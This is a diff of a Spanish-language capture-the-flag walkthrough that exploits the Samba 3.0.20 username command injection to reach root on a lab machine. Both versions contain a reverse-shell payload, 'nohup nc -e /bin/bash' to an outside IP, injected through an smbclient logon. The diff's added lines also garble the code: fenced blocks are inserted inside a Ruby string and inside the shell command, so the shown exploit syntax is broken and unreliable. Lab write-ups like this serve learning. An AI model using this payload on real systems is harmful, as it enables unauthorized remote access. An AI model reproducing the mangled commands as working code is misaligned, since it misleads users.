@@ -120,11 +120,19 @@ Si lanzamos el script no funcciona, parece ser que la version a sido parcheada -
 searchsploit samba 3.0.20
 ```
 
-Vemos que hay un exploit para Metasploit que permite ejecutar commandos. Examinamos el script con el commando `searchsploit -x 16320` y vemos
+Vemos que hay un exploit para Metasploit que permite ejecutar commandos. Examinamos el script con el commando 
+```bash
+ searchsploit -x 16320 
+```
+ y vemos
 que podemos injectar commandos desde el nombre de usuario con el formato siguiente
 
 ```ruby
-username = "/=`nohup " + payload.encoded + "`"
+username = "/=
+```bash
+ nohup " + payload.encoded + " 
+```
+"
 ```
 
 Vamos a por pruebas
@@ -158,7 +166,11 @@ Vemos que esto functionna perfectamente. Vamos a ganar accesso al systema.
 1. Intentamos enviar commandos siguiendo la guia del script
 
     ```bash
-    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.7 443`"'
+    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=
+```bash
+ nohup nc -e /bin/bash 10.10.14.7 443 
+```
+"'
     ```
 
 Hemos ganado accesso al systema.
@@ -180,4 +192,8 @@ stty -a
 stty rows <rownb> columns <colnb>
 ```
 
-Dandole a `whoami` vemos que ya estamos root ;) No se necessita escalar privilegios en este caso.
+Dandole a 
+```bash
+ whoami 
+```
+ vemos que ya estamos root ;) No se necessita escalar privilegios en este caso.
